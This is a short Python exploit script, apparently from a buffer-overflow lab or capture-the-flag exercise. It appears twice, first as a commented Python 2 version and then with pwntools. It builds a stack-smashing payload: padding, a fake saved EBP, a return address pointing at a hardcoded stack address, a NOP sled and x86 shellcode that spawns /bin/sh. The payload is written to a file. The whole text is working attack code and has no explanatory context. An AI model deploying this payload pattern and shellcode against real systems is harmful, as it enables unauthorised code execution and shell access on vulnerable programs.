# import struct
# padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
# ebp = "TTTT"
# eip = struct.pack("I", 0xffffcd20+150)
# shellcode = "\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# payload = padding + ebp + eip + shellcode
# print payload
from pwn import *
padding =b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = b"TTTT"
eip = p32(0xffffcd20+150)
shellcode = b"\x90" * 150 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = padding + ebp + eip + shellcode
with open('payload_shell', 'wb') as f:
    f.write(payload)